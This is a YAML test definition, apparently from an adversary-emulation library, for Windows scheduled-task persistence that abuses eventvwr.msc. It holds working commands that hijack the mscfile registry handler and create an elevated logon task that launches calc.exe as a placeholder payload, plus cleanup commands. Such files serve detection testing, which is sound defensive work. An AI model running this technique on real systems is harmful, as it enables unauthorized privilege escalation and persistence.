- id: 3c4093a1-f850-5110-a88b-085ffe934fd3
  name: Soumaia ART Tests - Scheduled Task Persistence via Eventviewer.msc
  description: 'Adds persistence by abusing `eventviewer.msc` via a scheduled task.

    When the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). (requires elevation)'
  tactic: privilege-escalation
  technique:
    attack_id: T1053.005
    name: 'Scheduled Task/Job: Scheduled Task'
  platforms:
    windows:
      cmd:
        command: |-
          reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\calc.exe" /f
          schtasks /Create /TN "EventViewerBypass" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
          ECHO Let's run the schedule task ...
          schtasks /Run /TN "EventViewerBypass"
        cleanup: |-
          reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
          schtasks /Delete /TN "EventViewerBypass" /F
